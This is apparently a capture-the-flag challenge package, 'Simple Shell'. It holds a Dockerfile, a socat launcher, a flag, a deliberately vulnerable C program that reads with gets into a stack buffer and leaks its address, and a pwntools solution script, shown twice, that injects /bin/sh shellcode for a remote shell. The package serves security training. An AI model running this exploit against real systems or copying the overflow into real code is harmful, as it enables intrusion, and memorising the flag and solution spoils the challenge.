{
    "Dockerfile": "FROM 32bit/ubuntu:16.04\n\nRUN apt update\nRUN apt install -y socat\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY entry.sh /entry.sh\nCOPY pwn3 /pwn/pwn3\nCOPY flag.txt /pwn/flag.txt\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/pwn3\n\nRUN chmod 4755 /pwn/pwn3\nRUN chmod 444 /pwn/flag.txt\n\nEXPOSE 4323\nCMD [\"./entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\n\nwhile :\ndo\n    su -c \"socat TCP4-listen:4323,reuseaddr,fork EXEC:/pwn/pwn3\" - pwnuser\ndone\n",
    "flag.txt": "gigem{r3m073_fl46_3x3cu710n}\n",
    "Makefile": "all: pwn\n\npwn: simple_shell.c\n\tgcc -fno-stack-protector simple_shell.c -m32 -z execstack -o pwn3\n",
    "pwn3": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\pwn\\pwn3\\pwn3]",
    "pwn_simple_shell.py": "from pwn import *\n\np = remote('172.17.0.2', 4323)\n#p = process('./pwn3')\n\nmsg = p.read().split(' ')\n\naddress = msg[-1][0:10]\nret = p32(int(address, 16))\n\nshellcode = (\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" +\n             \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" +\n             \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\")\nsled = '\\x90'*(302 - len(shellcode))\npayload =  sled + shellcode + ret\n\np.send(payload + '\\n')\np.interactive()\n\n",
    "README.md": "# Simple Shell\n\n## Challenge\n\n`nc pwn.tamuctf.com 4323`\n\n## Setup\nBuild the container with `docker build -t pwn3 .` and run it with `docker run -it --rm pwn3`\n\n## Solution\nFill the buffer with shell code and overwrite the return address with the one given to you.  \nBelow is an example solution:  \n```python\nfrom pwn import *\n\np = remote('172.17.0.2', 4323)\n#p = process('./pwn3')\n\nmsg = p.read().split(' ')\n\naddress = msg[-1][0:10]\nret = p32(int(address, 16))\n\nshellcode = (\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" +\n             \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" +\n             \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\")\nsled = '\\x90'*(302 - len(shellcode))\npayload =  sled + shellcode + ret\n\np.send(payload + '\\n')\np.interactive()\n```\n",
    "simple_shell.c": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid echo()\n{\n    char buf[290];\n    printf(\"Take this, you might need it on your journey %p!\\n\", buf);\n    gets(buf);\n}\n\nint main()\n{\n    setvbuf(stdout,_IONBF,0,0);\n    echo();\n}\n",
    "category": "Pwn"
}